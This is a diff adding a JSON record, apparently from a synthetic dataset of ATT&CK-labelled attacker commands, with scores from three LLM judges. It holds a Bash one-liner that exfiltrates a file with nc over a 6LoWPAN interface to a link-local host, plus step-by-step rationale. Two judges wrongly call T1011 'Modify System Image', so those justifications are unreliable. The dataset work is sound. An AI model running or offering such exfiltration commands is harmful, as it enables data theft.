@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i lowpan0 -nn 'ip6 and udp port 56831' -U -w /dev/null >/dev/null 2>&1 & nc -6 -u -s fe80::100%lowpan0 fe80::200%lowpan0 56831 < /var/tmp/data.blob",
+  "explanation": "Exfiltrates via a 6LoWPAN interface (lowpan0) over IPv6 UDP on a high port, with tcpdump limited to that interface and port. This leverages a low-power wireless medium distinct from the primary channel (T1011).",
+  "rationale_steps": [
+    "Use lowpan0 to exploit a separate low-power wireless medium.",
+    "Constrain to IPv6 UDP on uncommon port 56831.",
+    "Run tcpdump with a precise BPF filter and discard payloads.",
+    "Send data with nc -6 bound to lowpan0 using scoped link-local addresses."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-343b8c1b",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for both tcpdump and netcat, and correct background process handling with nohup.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt data exfiltration over a 6LoWPAN interface, it doesn't align with T1011 (Modify System Image) as it's performing exfiltration rather than modifying firmware/OS images.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:42:29.852344Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for both tcpdump and nc, proper command separators, and standard input/output redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "The command attempts data exfiltration, which is semantically misaligned with the T1011 Modify System Image technique, as it does not perform any image alteration.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:42:43.310880Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, correct backgrounding and redirections, and plausible flags for tcpdump and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates the file over IPv6 UDP on lowpan0 using link-local scoped addresses while running a constrained capture, aligning with T1011, though success depends on nc\u2019s IPv6 scope handling and tcpdump typically needing elevated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:43:47.248041Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
